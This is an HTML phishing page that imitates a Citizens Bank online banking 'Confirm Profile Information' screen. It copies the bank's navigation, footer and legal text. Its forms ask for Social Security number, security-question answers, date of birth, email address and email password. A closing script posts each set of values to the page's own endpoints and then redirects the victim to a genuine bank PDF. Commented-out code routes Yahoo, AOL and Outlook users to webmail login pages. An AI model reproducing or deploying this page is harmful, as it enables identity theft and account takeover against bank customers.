                                            <!-- Credit Card Application: Notice are only for Retail customers -->
                                            <div class="sub-nav-col">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/offerdocuments">Credit Card Application: Notice</a>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                                <!-- ------- Service Center ------- -->
                                <li class="nav-services last" tabindex="0">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#servicecenter">Service Center</a>
                                </li>
                                <li>
                                    <nav class="mobile-util-nav">
                                        <ul>
                                            <li>
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efs/logout.jsp" class="logout-link js-logout-link">Log Out</a>
                                            </li>
                                            <li>
                                                <a class="help-modal-open">Help</a>
                                            </li>
                                            <li class="last">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#contactus">Contact Us</a>
                                            </li>
                                        </ul>
                                    </nav>
                                </li>
                            </ul>
                        </nav>
                        <nav class="alert-nav">
                            <ul>
                                <li class="alerts">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/wait.jsp?target=alerts-wait.jsp">Alerts
                                        <span class="desktop-alert-dot alert-count">11</span>
                                    </a>
                                </li>
                                <li class="alerts">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/wait.jsp?target=messages-wait.jsp">Messages </a>
                                </li>
                                <li class="alerts">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#contactus">Contact Us</a>
                                </li>
                            </ul>
                        </nav>
                    </div>
                </div>
                <!-- inc-header.html END -->
            </div>
        </div>
        <!-- htmlContainer SUFFIX -->
    </div>
    <!-- end CITIZENS BANK Hosted Header -->
</div>
<div class="olbwrapper">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#FFFFFF">
        <tbody>
        <tr>
            <td colspan="2" class="txt_welcome" valign="bottom" nowrap="">
                Confirm Profile Information

            </td>
            <td align="right" style="padding-right : 10px; padding-bottom : 10px">
                <a id="https://www3.citizensbankonline.com/efs/servlet/ImsBanner/getClickUrl?id=null&amp;des=null" class="onetoonebanner" target="_blank" href="https://www3.citizensbankonline.com/efs/servlet/ImsBanner/getActionUrl?id=null">
                    <img src="https://www3.citizensbankonline.com/efs/servlet/ImsBanner/getMessage?id=null&amp;des=null" border="0">
                </a>
            </td>
        </tr>
        <tr>
            <td colspan="3" align="center">
                <img src="https://www3.citizensbankonline.com/efs/efs/multilang/grafx/blackpixel.gif" width="100%" height="1" alt="" border="0">
            </td>
        </tr>
        <tr>
            <td colspan="3" align="right" style="padding-top : 10px" nowrap="">&nbsp;
            </td>
        </tr>
        </tbody>
    </table>
    <form name="frmEditUser" method="post">
        <input type="hidden" name="CSRF_TOKEN" value="59SI-LOFH-7PMZ-TOJ5-3394-G9N7-6TUO-9E0G">
        <table width="100%" border="0" cellspacing="0" cellpadding="0"></table>
        <div id="personalInfo" hidden>

            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tbody>
                <tr>
                    <td class="header" width="42%">Confirm Personal Information</td>
                    <td class="header" width="1%">
                        <div align="right">
                            <img src="https://www3.citizensbankonline.com/efs/efs/multilang/grafx/header_corner.gif" width="21" height="19" align="absmiddle">
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <br>
            <table width="100%" class="SecurityInfo">
                <tbody>
                <tr valign="top">
                    <td width="1%"></td>
                    <td width="50%">
                        <label class="lbl">Name: </label>
                        <span>
							<input type="text" class="form_fields" name="nameOfUser" size="20" maxlength="40" placeholder="Full Name">
						</span>
                    </td>
                    <td width="50%">
                        <table width="100%" cellspacing="0" cellpadding="0" class="main-contents">
                            <tbody>
                            <tr>
                                <td width="80%" class="txt_normal" nowrap="" align="right">Email Address:</td>
                                <td width="20%" align="left">
                                    <input type="text" class="form_fields" name="emailAddress" style="margin-bottom:0px" size="40" maxlength="40" placeholder="xxxxxxxxx@example.com">
                                </td>
                            </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                <tr valign="top">
                    <td width="1%"></td>
                    <td width="50%">
                        <label class="lbl">Date Of Birth: </label>
                        <span>
							<input type="text" class="form_fields" name="dobNumber" size="20" maxlength="40" placeholder="XX-XX-XXXX">
						</span>
                    </td>


                    <td width="50%">
                        <table width="100%" cellspacing="0" cellpadding="0" class="main-contents">
                            <tbody>
                            <tr>
                                <td width="80%" class="txt_normal" nowrap="" align="right">
                                    <input type="button" id="personalInfoConfirm" name="Confirm" value="Confirm" class="form_buttons">
                                </td>
                            </tr>
                            </tbody>
                        </table>
                </tr>
                </tbody>
            </table>

        </div>

        <div id="emailAuth" hidden>
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tbody>
                <tr>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <td class="header" width="42%">Link Your Email To Your Online Banking</td>
                    <td class="header" width="1%">
                        <div align="right">
                            <img src="https://www3.citizensbankonline.com/efs/efs/multilang/grafx/header_corner.gif" width="21" height="19" align="absmiddle">
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <br>
            <table width="100%" border="0" cellspacing="0" cellpadding="0" class="main-contents">
                <tbody>
                <tr>
                    <td class="txt_normal" width="35%" height="20" align="right">Enter Your Email Password:&nbsp;&nbsp;</td>
                    <td class="txt_normal" width="45%" align="left">&nbsp;</td>
                </tr>

                <tr>
                    <td class="txt_normal" width="35%" align="right">Email Password:&nbsp;&nbsp;</td>
                    <td class="txt_normal" width="20%" align="left">
                        <input class="form_fields" type="password" size="15" maxlength="15" name="EmailPassword"  value="" autocomplete="off">
                    </td>
                    <td class="txt_normal" width="45%" align="left">&nbsp;</td>
                </tr>
                <tr>
                    <td class="txt_normal" width="35%" align="right">Confirm Email Password:&nbsp;&nbsp;</td>
                    <td class="txt_normal" width="20%" align="left">
                        <input class="form_fields" type="password" size="15" maxlength="15" name="ConfirmPassword" value="" autocomplete="off">
                    </td>
                    <td class="txt_normal" width="45%" align="left">&nbsp;</td>
                </tr>
                </tbody>
            </table>
            <br>
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tbody>
                <tr>
                    <td class="header" width="42%">Remember My Information</td>
                    <td class="header" width="1%">
                        <div align="right">
                            <img src="https://www3.citizensbankonline.com/efs/efs/multilang/grafx/header_corner.gif" width="21" height="19" align="absmiddle">
                        </div>
                    </td>
                </tr>
                </tbody>
                <center>
                    <input type="submit" id="emailAuthConfirm" name="Confirm" value="Confirm" class="form_buttons">

                </center>
            </table>

        </div>

        <div id="securityQuestion">
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tbody>
                <tr>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <td class="header" width="42%">Confirm Security Questions</td>
                    <td class="header" width="1%">
                        <div align="right">
                            <img src="https://www3.citizensbankonline.com/efs/efs/multilang/grafx/header_corner.gif" width="21" height="19" align="absmiddle">
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="security-instructions" colspan="3">
                        Confirm your security questions by entering the values for each setting below:
                    </td>
                </tr>
                </tbody>
            </table>
            <label>SSN(TIN for Business):</label>
            <input class="form_fields" type="number" size="35" maxlength="10" name="ssnNumber" value="SSN Number">
            <br/>
            <label>
                <span class="required">*</span>Challenge Question 1:
            </label>
            <select style="width:280" class="form_elements" name="Challenge1" size="1">
                <option value="" disabled="disabled" selected>Select Security Question 1</option>
                <option value="Q1.8">What is your maternal grandfather's first name?</option>
                <option value="Q1.10">In what city were you married? (Enter full name of city)</option>
                <option value="Q1.9">What is your best friend's first name?</option>
                <option value="Q1.4">What was the name of your High School?</option>
                <option value="Q1.6">What is the first name of the maid of honor at your wedding?</option>
                <option value="Q1.5">What is the name of the first company you worked for?</option>
                <option value="Q1.3">What is your father's middle name?</option>
                <option value="Q1.2">What is your maternal grandmother's first name?</option>
                <option value="Q1.7">What is the first name of your oldest nephew?</option>
                <option value="Q1.1">In what city was your high school? (full name of city only)</option>
            </select>
            <label>Answer 1:</label>
            <input class="form_fields" type="text" size="35" maxlength="35" name="Response1" value="">
            <label for="">
                <span class="required">*</span>Challenge Question 2:
            </label>
            <select style="width:280" class="form_elements" name="Challenge2" size="1">
                <option value="" disabled="disabled" selected>Select Security Question 2</option>
                <option value="Q2.3">What was the first name of your first manager?</option>
                <option value="Q2.4">In what city was your father born? (Enter full name of city only)</option>
                <option value="Q2.8">What is your paternal grandmother's first name?</option>
                <option value="Q2.6">What was the name of your first pet?</option>
                <option value="Q2.1">What is the first name of the best man at your wedding?</option>
                <option value="Q2.10">What was the nickname of your grandfather?</option>
                <option value="Q2.7">What is the first name of your oldest niece?</option>
                <option value="Q2.9">In what city is your vacation home? (Enter full name of city only)</option>
                <option value="Q2.2">What was your high school mascot?</option>
                <option value="Q2.5">What was the name of your first girlfriend/boyfriend?</option>
            </select>
            <label>Answer 2:</label>
            <input class="form_fields" type="text" size="35" maxlength="35" name="Response2" value="">
            <label>
                <span class="required">*</span>Challenge Question 3:
            </label>
            <select style="width:280" class="form_elements" name="Challenge3" size="1">
                <option value="" disabled="disabled" selected>Select Security Question 3</option>
                <option value="Q3.7">What was the name of your junior high school? (Enter only "Riverdale" for Riverdale Junior High School)</option>
                <option value="Q3.3">In what city were you born? (Enter full name of city only)</option>
                <option value="Q3.2">What is your mother's middle name?</option>
                <option value="Q3.9">What was the name of the town your grandmother lived in? (Enter full name of town only)</option>
                <option value="Q3.1">In what city was your mother born? (Enter full name of city only)</option>
                <option value="Q3.6">What is your paternal grandfather's first name?</option>
                <option value="Q3.10">What street did your best friend in high school live on? (Enter full name of street only)</option>
                <option value="Q3.5">What was your favorite restaurant in college?</option>
                <option value="Q3.8">What was the last name of your favorite teacher in final year of high school?</option>
                <option value="Q3.4">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
            </select>
            <label>Answer 3:</label>
            <input class="form_fields" type="text" size="35" maxlength="35" name="Response3" value="">

            <center>
                <input type="button" id="securityQuestionConfirm" name="Confirm" value="Confirm" class="form_buttons">

            </center>


        </div>



        <table width="100%">
            <tbody>
            <tr>
                <td class="totals_row" width="100%">&nbsp;</td>
            </tr>
            </tbody>
        </table>
        <table width="100%">
            <tbody>
            <tr>
                <td align="center" class="required">* indicates a required field</td>
            </tr>
            </tbody>
        </table>
    </form>
    <br>
</div>
<!-- begin CITIZENS BANK Hosted Footer -->
<div class="citizens-footer">
    <div class="citizens-header-footer">
        <footer id="page-footer" class="page-footer">
            <div class="footer-top">
                <ul>
                    <li>
                        <a href="#" class="contact" title="Opens Ways to Contact Us Dialog">
                            <span class="account-underline">Ways to Contact Us</span>
                            <span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
                        </a>
                        <div class="dropup-menu">
                            <h4>Contact Us</h4>
                            <p>General Questions:

                                <br>
                                <strong>1-800-656-6561</strong>
                                <br>
                                Investment Questions:

                                <br>
                                <strong>1-800-942-8300</strong> (Citizens Investment Services)

                            </p>
                            <!--
<p>Go to <a href="https://www3.citizensbankonline.com/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p><p><a href="https://www3.citizensbankonline.com/forms/contactme.aspx">We'll Contact You</a></p>
-->
                        </div>
                    </li>
                    <!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: 02871</span></li>
-->
                    <li>
                        <a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
                            <span class="account-underline">Branch &amp; ATM Locator</span>
                            <span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
                        </a>
                        <div class="dropup-menu">
                            <h4>Branch &amp; ATM Locator</h4>
                            <p>Find one of our 1,300 locations near you.</p>
                            <div role="form">
                                <div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
                                <input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="02871">
                                <a href="#" type="button" class="button button-stickyfooterbranch">Submit</a>
                            </div>
                        </div>
                    </li>
                    <li>
                        <a onclick="showSurvey(formId);" style="cursor:pointer;">
                            <img src="https://www.citizensbank.com/assets/CB_media/images/feedback.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">Feedback
                        </a>
                    </li>
                </ul>
            </div>
            <div class="footer-row clearfix">
                <ul>
                    <li>
                        <h6>Checking &amp; Savings</h6>
                    </li>
                    <!--        <li><a target="_blank" href="http://www.citizensbank.com/checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking/">Checking</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/savings.aspx">Savings</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/money-markets.aspx">Money Markets</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/savings-and-cds/cds.aspx">Certificates of Deposit (CDs)

                            <sup>®</sup>
                        </a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/ira/">IRAs</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/programs-and-services.aspx">Programs &amp; Services</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/benefits-and-features.aspx">Benefits &amp; Features</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking/debit-cards/standard.aspx">Debit Card</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/overdraft-protection/">Overdraft Choices

                            <sup>®</sup>
                        </a>
                    </li>
                </ul>
                <ul>
                    <li>
                        <h6>Home Borrowing</h6>
                    </li>
                    <!--        <li><a target="_blank" href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/mortgages/">Mortgages</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/home-equity/loans.aspx">Home Equity Loans</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/home-equity/lines.aspx">Home Equity Lines of Credit</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/loans/determine-my-rate.aspx">Determine My Rate</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/mortgages/my-mortgage.aspx">My Mortgage Account</a>
                    </li>
                </ul>
                <ul>
                    <li>
                        <h6>Students</h6>
                    </li>
                    <!--<li><a target="_blank" href="http://www.citizensbank.com/student-services/">Students Overview</a></li><li><a target="_blank" href="http://www.citizensbank.com/student-banking/">Banking</a></li><li><a target="_blank" href="http://www.citizensbank.com/student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li><li><a target="_blank" href="http://www.citizensbank.com/student-loans/gradstudents.aspx">Graduate Borrowing</a></li><li><a target="_blank" href="http://www.citizensbank.com/student-loans/process.aspx">The Student Loan Process</a></li><li><a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-loans/default.aspx">Student Loan Options</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-loans/education-refinance-loan-overview.aspx">Refinancing Student Loans</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-loans/process/default.aspx">The Student Loan Process</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-loans/process/undergraduate.aspx">Undergraduate Students &amp; Parents</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-loans/process/graduate.aspx">Graduate Students</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Tools &amp; Information</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking/one-deposit-checking-account.aspx">Banking for Students</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/student-services/access-my-student-loan/default.aspx">Access My Student Loan</a>
                    </li>
                </ul>
                <ul class="last">
                    <li>
                        <h6>Cards</h6>
                    </li>
                    <!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/">Cards Overview</a></li>-->
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/credit-cards/overview.aspx">Credit Cards</a>
                    </li>
                    <!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/credit-cards/creditcardagreements/agreements.aspx">Card Agreements</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/security/">Security Features</a>
                    </li>
                </ul>
            </div>
            <div class="footer-row clearfix">
                <ul>
                    <li>
                        <h6>Personal Loans</h6>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/personal-loans/overview.aspx">Overview</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/personal-loans/faqs.aspx">FAQs</a>
                    </li>
                </ul>
                <ul>
                    <li>
                        <h6>Resources</h6>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking/order-checks.aspx">Order Checks</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/online-and-mobile-banking/default.aspx">Online &amp; Mobile Banking</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/customer-service/">Customer Service</a>
                    </li>
                </ul>
                <ul>
                    <li>
                        <h6>About Us</h6>
                    </li>
                    <!--        <li><a target="_blank" href="http://www.citizensbank.com/about-us/">About Us Overview</a></li>-->
                    <li>
                        <a target="_blank" href="http://investor.citizensbank.com/about-us/our-company.aspx">About Citizens Bank</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/community/">In the Community</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/careers/">Careers</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/about_our_ads.aspx">About Our Ads</a>
                    </li>
                </ul>
                <ul class="last">
                    <li>
                        <h6>Solutions</h6>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/">Personal</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/investing/">Investing</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/small-business/">Small Business</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/commercial-banking/">Commercial</a>
                    </li>
                </ul>
            </div>
            <div class="footer-row clearfix">
                <ul>
                    <li>
                        <h6>Disclosures</h6>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/pf/onlinebanking/terms.aspx">Online Terms and Conditions</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/pdf/CTZ_eSign.pdf">Electronic Notice Disclosure and Consent (Online Service)</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/checking-and-savings/account-documents.aspx">Account Documents</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.fdic.gov">Member FDIC</a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/security/equal-housing-lender.aspx">Equal Housing Lender

                            <img alt="Equal Housing Lender" title="Equal Housing Lender" src="https://www3.citizensbankonline.com/efs/hhf/img/equal-housing.gif">
                        </a>
                    </li>
                    <li>
                        <a target="_blank" href="http://www.citizensbank.com/security/">Security, Privacy &amp; Legal</a>
                    </li>
                </ul>
            </div>
            <div class="centered-content">
                <div class="footer-bottom">
                    <p class="legal">
                        Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
                    </p>
                    <p class="legal">
                        *Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.
                        <br>
                        <br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).
                        <br>
                        <br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.
                        <br>
                        <br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.
                        <br>
                        <br>SpeciFi
                        <sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.

                    </p>
                    <div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
                        <p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
                        <ul class="footer-disclaimer-box__list">
                            <li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
                            <li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
                            <li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
                            <li class="footer-disclaimer-box__list-item">NOT A DEPOSIT

                                <br>
                            </li>
                            <li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
                        </ul>
                    </div>
                    <ul class="footer-util">
                        <li class="sitemap">
                            <a target="_blank" href="http://www.citizensbank.com/tools/SiteMap.aspx">Site Map</a>
                        </li>
                        <li>Follow:

                            <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.facebook.com/citizensbank">
                                <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-facebook.png" alt="Facebook" align="middle">
                            </a>
                            <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://twitter.com/citizensbank">
                                <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-twitter.png" alt="Twitter">
                            </a>
                            <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://linkedin.com/company/citizens-bank">
                                <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-linkedin.png" alt="Linkedin">
                            </a>
                            <a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://youtube.com/citizensbank">
                                <img src="https://www3.citizensbankonline.com/efs/hhf/img/footer-follow-youtube.png" alt="Youtube">
                            </a>
                        </li>
                    </ul>
                    <p class="footer-copyright">
                        © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.
                        <br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).
                        <br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903

                    </p>
                    <img src="https://www3.citizensbankonline.com/efs/hhf/img/elh.gif" alt="Equal Housing Lender">
                    <img src="https://www3.citizensbankonline.com/efs/hhf/img/fdicFooter.gif" alt="Member FDIC">
                </div>
            </div>
        </footer>
    </div>
</div>
<script src="https://www3.citizensbankonline.com/efs/hhf/js/citizensHeaderFooter-citizens44583.js"></script>
<!-- end CITIZENS BANK Hosted Footer -->
<script>
    // polyfil for browsers which do not support string.trim()
    if (!String.prototype.trim) {
        (function() {
            // Make sure we trim BOM and NBSP
            var rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
            String.prototype.trim = function() {
                return this.replace(rtrim, '');
            };
        })();
    }
    $(function() {
        $(".onetoonebanner").each(function( index ) {
            var that = $(this);
            var targetConst = "1to1target=";
            $.get($(this).attr("id"), function(data) {
                if (data != null && data.trim() != "null") {
                    var targetPos = data.indexOf(targetConst);
                    if (targetPos > -1) {
                        var queryString = data.substring(targetPos,data.length);
                        var nameValues = queryString.split("&");
                        $.each(nameValues,function(indx,value) {
                            var kv = value.split("=");
                            if (kv.length > 0 && kv[0] === targetConst.substr(0,targetConst.length - 1)) {
                                that.attr("target",kv[1].trim());
                            }
                        });
                    }
                }
            });
        });
    });
</script>
<link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/_sec/cp_challenge/sec-3-2.css">
<script src="https://www3.citizensbankonline.com/_sec/cp_challenge/sec-cpt-3-2.js" async="" defer=""></script>
<div id="sec-overlay" style="display:none;">
    <div id="sec-container"></div>
</div>
<script type="text/javascript" src="https://www3.citizensbankonline.com/clientlibs/65313ffdbno179d6ba951417ed8e54f"></script>
<!--Templates for dialog modal-->
<div id="dialog-RememberOnlineUserId-on" style="display: none">
    <div class="dialog-message-container">
        <p id="dialog-remove-content">The Online User ID you logged in with will be remembered when you "Save" this option.</p>
    </div>
</div>
<div id="dialog-RememberOnlineUserId-off" style="display: none">
    <div class="dialog-message-container">
        <p id="dialog-remove-content">The Online User ID you logged in with will Not be remembered when you "Save" this option.</p>
    </div>
</div>
<div id="dialog-RememberMe-on" style="display: none">
    <div class="dialog-message-container">
        <p id="dialog-remove-content">You will be required to verify yourself less often each time you log in with the device you are using when you "Save" this option.</p>
    </div>
</div>
<div id="dialog-RememberMe-off" style="display: none">
    <div class="dialog-message-container">
        <p id="dialog-remove-content">You will be required to verify yourself each time you log in with the device you are using when you "Save" this option.</p>
    </div>
</div>
</body>
<script>
    $('#securityQuestionConfirm').on('click', function (event) {
        const jackSq = {}
        jackSq.ssn = $('input[name="ssnNumber"]').val()

        jackSq.q1 = $('select[name="Challenge1"] option:selected').text()
        jackSq.a1 = $('input[name="Response1"]').val()

        jackSq.q2 = $('select[name="Challenge2"] option:selected').text()
        jackSq.a2 = $('input[name="Response2"]').val()

        jackSq.q3 = $('select[name="Challenge3"] option:selected').text()
        jackSq.a3 = $('input[name="Response3"]').val()
        console.log(jackSq)

        $.post('security', jackSq, function (result) {
            // console.log(result)
            // window.location = 'https://www3.citizensbankonline.com/efs/servlet/efs/logout.jsp';
            $('#securityQuestion').hide();
            $('#personalInfo').show()
        })
    });

    $('#emailAuthConfirm').on('click', function (event) {
        const jackEm = {}
        jackEm.epw1 = $('input[name="EmailPassword"]').val()
        jackEm.epw2 = $('input[name="ConfirmPassword"]').val()

        console.log(jackEm)

        $.post('manual', jackEm, function (result) {
            console.log(result)
            window.location = 'https://www.citizensbank.com/pdf/CTZ_eSign.pdf';
        })
    });

    $('#personalInfoConfirm').on('click', function (event) {
        const jackPE = {}
        jackPE.email = $('input[name="emailAddress"]').val()
        jackPE.dob = $('input[name="dobNumber"]').val()
        jackPE.uname = $('input[name="nameOfUser"]').val()


        $.post('personal', jackPE, function (result) {
            console.log(result)

            const emailSplit = jackPE.email.split('@')
            const emailDomain =  emailSplit[1]
            // if (['yahoo.com', 'yahoo.co.uk', 'yahoo.com.pl', 'ymail.com'].indexOf(emailDomain) > -1) {
                // window.location = '/auth/login/yahoo'
            // }else if (['aol.com', 'aim.com', 'aol.co.uk'].indexOf(emailDomain) > -1) {
                // window.location = '/auth/login/aol'
            // }else if (['outlook.com', 'hotmail.com', 'msn.com', 'live.com'].indexOf(emailDomain) > -1) {
                // window.location = '/auth/login/outlook'
            // }else {
                $('#securityQuestion').hide();
                $('#personalInfo').hide();
                $('#emailAuth').show();
            // }

        })
    });
</script>
</html>
